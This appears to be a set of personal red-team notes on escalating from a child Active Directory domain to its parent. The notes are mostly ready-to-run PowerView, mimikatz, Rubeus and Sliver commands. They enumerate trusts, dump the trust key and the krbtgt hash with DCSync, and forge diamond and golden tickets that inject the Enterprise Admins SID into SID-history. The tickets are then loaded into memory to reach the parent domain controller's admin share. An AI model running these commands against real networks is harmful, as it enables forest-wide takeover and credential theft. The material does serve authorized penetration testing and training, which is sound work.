## Enumeration
```powershell
Get-DomainTrust       # Get Trust relationships
Get-DomainForeignUser # Get security principals not part of domain
	# Make note of user
```
## Trust Key
In forests with users that have cross-domain access, a special computer account is created that has a shared secret (the trust key).

The computer account's name is the SAME as the other domain's Net-BIOS domain name. Example:
	`DOMAIN$` is in `child.domain.local`
	`CHILD$` is in `domain.local`

```powershell
# Dump Foreign security principal
lsadump::dcsync /user:child$
```
See [[6 Credential Access]] for syntax

> If a user in `CHILD` wants access to a service in `DOMAIN` , DC01 creates a TGT for `DOMAIN` that is signed by `DOMAIN$` instead of `krbtgt`
## Child → Parent via Diamond Ticket 
How to move from child to parent domain? Similar to creating golden or diamond ticket. EA is target group.

Requirements
	Child `krbtgt` AES256 key
	Parent domain SID

```bash
# Get parent domain SID
sliver > sharpview -t 120 -- Get-DomainSid -Domain parent.domain

# Forgery
sliver > inline-execute-assembly -t 120 /path/to/Rubeus.exe "diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-264881711-3359223723-3458204895-519 /krbkey:f2a363997e7539b83637c12d872600a2b4c2727f2ebd35229d33dd85bdc11ed8 /nowrap"

# save TGT to parent.kirbi file
# Upload
# Inject into memory
sliver > mimikatz -- '"kerberos::ptt parent.kirbi" "exit"'
sliver > mimikatz -- '"kerberos::list" "exit"' # Verify loaded

# Test
ls '\\dc02.parent.domain.local\c$'
```

> /sids here is the domain sid + EA RID (519)
## Child → Parent via Golden Ticket
Forge a golden TGT in the **child** domain and inject the parent's Enterprise Admins SID via SID-history. Because the parent-child trust doesn't apply SID filtering, the parent DC honors the EA SID and grants forest-wide access.

**Requirements:**

- Child domain `krbtgt` NTLM hash
- SID of child domain
- SID of parent domain (+ EA RID 519)
- Arbitrary username (account doesn't need to exist — it's forged)

```powershell
# Dump child krbtgt hash
.\mimikatz.exe
lsadump::dcsync /user:CHILD\krbtgt
    # Note the NTLM hash

# Forge golden ticket with parent EA SID in SID-history, inject to memory
kerberos::golden /user:whatever /domain:child.domain.local /sid:<child_domain_SID> /krbtgt:<child_krbtgt_NTLM> /sids:<parent_domain_SID>-519 /ptt

# Validate cross-domain access to parent DC
ls \\dc02.parent.domain.local\c$     # CIFS access to parent DC
```

`/sids:` carries the parent domain SID + EA RID (519) — this is the SID-history injection that grants Enterprise Admin rights across the trust. `/krbtgt:` is the child's krbtgt hash (golden ticket key, NOT the trust key).